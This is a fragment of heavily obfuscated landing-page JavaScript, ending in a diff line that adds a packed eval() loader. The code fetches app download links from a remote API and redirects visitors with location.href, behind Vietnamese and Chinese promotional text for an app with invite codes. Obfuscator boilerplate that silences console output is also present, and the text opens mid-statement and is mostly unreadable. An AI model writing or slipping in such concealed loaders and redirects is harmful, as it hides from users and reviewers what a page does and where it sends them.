_0x135a32=_0x21209d[_0x7369('0x53')](_0x21209d[_0x7369('0x2')](apiUrl,_0x21209d[_0x7369('0x69')]),_0x34f731);$[_0x7369('0x29')]({'method':_0x7369('0x45'),'url':_0x135a32,'headers':{'Content-type':_0x21209d['xXIVT'],'X-UDID':_0x21209d[_0x7369('0x7a')],'X-Timestamp':date,'X-Sign':$[_0x7369('0x16')](_0x21209d[_0x7369('0x2')](_0x21209d[_0x7369('0x5c')](_0x7369('0x2a'),_0x21209d[_0x7369('0x22')]),date)),'side_code':sideCode}})[_0x7369('0x61')](_0x501b08=>{console[_0x7369('0x52')](_0x501b08,_0x21209d['YXMib']);});}function downloadApp(_0x1fad13){const _0x5a662c={};_0x5a662c['PwRLJ']=_0x7369('0x2c');_0x5a662c[_0x7369('0x20')]=_0x7369('0x35');_0x5a662c[_0x7369('0x4f')]=function(_0x41ec64,_0x2f6ab8){return _0x41ec64(_0x2f6ab8);};_0x5a662c[_0x7369('0x75')]=_0x7369('0xe');_0x5a662c[_0x7369('0x54')]=_0x7369('0x2a');_0x5a662c[_0x7369('0x13')]=function(_0x3ce3cb,_0x1352b0){return _0x3ce3cb+_0x1352b0;};_0x5a662c[_0x7369('0x78')]=_0x7369('0x11');const _0x3ca5a9=_0x5a662c;let _0x411779=_0x1fad13[_0x7369('0x40')]+reg;$[_0x7369('0x29')]({'method':_0x7369('0x45'),'url':_0x411779,'headers':{'Content-type':_0x3ca5a9[_0x7369('0x75')],'X-UDID':_0x3ca5a9['dMHBS'],'X-Timestamp':date,'X-Sign':$[_0x7369('0x16')](_0x3ca5a9[_0x7369('0x13')](_0x7369('0x2a'),_0x3ca5a9[_0x7369('0x78')])+date),'side_code':sideCode}})[_0x7369('0x61')](_0x436a5b=>{let _0x3d88c3=_0x436a5b;if(_0x3d88c3[_0x7369('0x70')]){if(_0x3ca5a9['PwRLJ']===_0x3ca5a9[_0x7369('0x20')]){const _0x25c962={};_0x25c962['log']=func;_0x25c962[_0x7369('0x6b')]=func;_0x25c962[_0x7369('0x24')]=func;_0x25c962[_0x7369('0x38')]=func;_0x25c962[_0x7369('0x66')]=func;_0x25c962[_0x7369('0xc')]=func;_0x25c962[_0x7369('0x5')]=func;_0x25c962['trace']=func;return _0x25c962;}else{_0x3d88c3[_0x7369('0x7e')]=_0x3ca5a9['sdZbK'](decrypt,_0x3d88c3[_0x7369('0x7e')]);}}if(_0x436a5b['data']){location[_0x7369('0x2f')]=_0x436a5b[_0x7369('0x7e')];}});}function copyText(_0x9fb5){const _0x49b4aa={};_0x49b4aa[_0x7369('0x47')]='input';_0x49b4aa[_0x7369('0x67')]=_0x7369('0x1e');const _0x13e156=_0x49b4aa;let _0x36534b=document['createElement'](_0x13e156['mLVPu']);_0x36534b[_0x7369('0x3b')]=_0x9fb5;document[_0x7369('0x3c')]['appendChild'](_0x36534b);_0x36534b['select']();document[_0x7369('0x17')](_0x13e156[_0x7369('0x67')]);_0x36534b[_0x7369('0x7f')]();}const updateClipboard=_0x3f55b9=>{const _0x2c4247={};_0x2c4247[_0x7369('0x80')]=_0x7369('0x59');const _0x181511=_0x2c4247;navigator[_0x7369('0x6a')][_0x7369('0x6')](_0x3f55b9)[_0x7369('0x61')](()=>{console[_0x7369('0x52')]('邀请码复制成功');},()=>{console[_0x7369('0x52')](_0x181511[_0x7369('0x80')]);});};$(document)['ready'](function(){const _0x3c5503={};_0x3c5503[_0x7369('0x4b')]=function(_0x4e7282,_0xa5e784){return _0x4e7282(_0xa5e784);};_0x3c5503['rXpIr']=_0x7369('0x1c');_0x3c5503[_0x7369('0x37')]=_0x7369('0x49');_0x3c5503[_0x7369('0x28')]=function(_0x5e0af9,_0x4c1304){return _0x5e0af9+_0x4c1304;};_0x3c5503[_0x7369('0x5b')]=_0x7369('0x83');_0x3c5503['qPzUg']=function(_0x1681d5,_0x14b000){return _0x1681d5===_0x14b000;};_0x3c5503[_0x7369('0x4a')]=function(_0x316a9a){return _0x316a9a();};_0x3c5503[_0x7369('0x73')]=function(_0x729be6,_0xada6b0){return _0x729be6===_0xada6b0;};_0x3c5503['IfnGp']=_0x7369('0x32');_0x3c5503[_0x7369('0x43')]=function(_0x3b731d,_0xeb6d97){return _0x3b731d+_0xeb6d97;};const _0x2923f3=_0x3c5503;$(_0x7369('0x14'))['click'](function(_0x4d6c48){const _0x29c523={};_0x29c523['Mcujs']=function(_0x197379,_0x1667a4){return _0x2923f3['eOWLq'](_0x197379,_0x1667a4);};_0x29c523['jQpcE']=_0x2923f3[_0x7369('0x7')];_0x29c523[_0x7369('0xb')]=_0x2923f3['jMksc'];const _0xbcdc72=_0x29c523;let _0x5ab009=_0x2923f3[_0x7369('0x28')](_0x2923f3[_0x7369('0x5b')],reg);if(_0x2923f3[_0x7369('0x12')](_0x2923f3[_0x7369('0x4a')](judgeClient),_0x7369('0x6e'))){downloadApp(ios);}else{if(_0x2923f3[_0x7369('0x73')](_0x2923f3[_0x7369('0x82')],_0x7369('0x3'))){globalObject=_0xbcdc72[_0x7369('0x7c')](Function,_0xbcdc72[_0x7369('0x46')]+_0xbcdc72[_0x7369('0xb')]+');')();}else{_0x2923f3['eOWLq'](downloadApp,Android);}}});_0x2923f3['eOWLq']($,_0x7369('0x8'))[_0x7369('0xa')](function(_0x4bf2fb){location[_0x7369('0x2f')]=_0x2923f3[_0x7369('0x43')](h5['urlDown'],reg);});});
+        eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('A 22({1G:\'#1q\',9:{p:\'l\',1z:[\'l\',\'16\'],1D:\'\',g:\'\',q:1,1o:\'1F://1K.1P.1Q\',1u:[],B:r,1k:r,1m:r,z:r,1L:{\'l\':{\'14\':\'1E\',\'17\':[{\'f\':\'19 v 18 s n\',\'e\':1,\'d\':\'o t s Z, 11 13 n 12 1g\',\'i\':\'15 u\'},{\'f\':\'o 1h 1j\',\'e\':2,\'d\':\'1i 1b 1a 1c, t 1d Y L\',\'i\':\'K u\'},{\'f\':\'w x v I F\',\'e\':3,\'d\':\'w x 24/7, S U W V O N P\',\'i\':\'2 Q\'}]},\'16\':{\'14\':\'1H 1N 1M \',\'17\':[{\'f\':\'19 v 18 s n\',\'e\':1,\'d\':\'o t s Z, 11 13 n 12 1g\',\'i\':\'15 u\'},{\'f\':\'o 1h 1j\',\'e\':2,\'d\':\'1i 1b 1a 1c, t 1d Y L\',\'i\':\'K u\'},{\'f\':\'w x v I F\',\'e\':3,\'d\':\'w x 24/7, S U W V O N P\',\'i\':\'2 Q\'}]},}},27(){8.g=10.1e.1f.26("/")[3]m(8.g&&8.g.28>=7){8.p=8.1z[8.g.1V(0,-6)]||\'l\'}1s{8.p=1U()[0]}8.q=8.p===\'l\'?0:1;8.1B()},1Y:{1B(){D c=+A 1v()1l.1X(8.1o+\'/20/1q/1Z/23/1T\',{},{1C:{\'1n-1w\':\'1x/1t\',\'X-1A\':\'y\',\'X-1r\':c,\'X-1y\':$.R(\'y\'+\'T,G\'+c),\'H\':8.q}}).E((h)=>{1W a=h.9 m(a.M){a.9=J(a.9)}8.B=a.9.j(b=>b.k===4)[0]8.1k=a.9.j(b=>b.k===1)[0]8.1m=a.9.j(b=>b.k===2)[0]8.z=a.9.j(b=>b.k===5)[0].1p 8.1u=a.9.j(b=>b.k===3)})},21(){m(25()===\'1S\'){C(8.B)}1s{C(8.1I)}},C(b){D c=+A 1v()1l.1O(b.1p+g,{},{1C:{\'1n-1w\':\'1x/1t\',\'X-1A\':\'y\',\'X-1r\':c,\'X-1y\':$.R(\'y\'+\'T,G\'+c),\'H\':8.q}}).E(h=>{D a=h.9;m(a.M){a.9=J(a.9)}m(h.9){1e.1f=h.9}})},1J(){10.1R(8.z)}}});',62,133,'||||||||this|data|response|item|date|title|avatar|name|reg|res|time|filter|position|zh|if|đáng|Bảo|lang|sideCode|null|chính|đảm|秒前|bằng|Phục|vụ|AC197BDFE685711D88B655735D8EB630|serviceUrl|new|ios|downloadApp|let|then|tim|3344322|side_code|trái|decrypt|53|ninh|secret|lúc|cứ|nào|分钟前|md5|chờ|6fff|đợi|bất|bạn||an|thức|window|trình|tin|bày|appName||vi|hots|và|công|mã|chế|hóa|bảo|location|href|cậy|lãnh|Cơ|quỹ|android|axios|h5|Content|apiUrl|urlDown|app|Timestamp|else|json|downloadList|Date|type|application|Sign|langs|UDID|getDownloadList|headers|code|panda直播|https|el|Quả|Android|onService|api|allData|đào|anh|get|c4prfy|com|open|IOS|list|getCurrentLanguage|slice|const|post|methods|user|promotion|onDownloadApp|Vue|landingpage||judgeClient|split|mounted|length'.split('|'),0,{}))
     </script>
 </body>
 
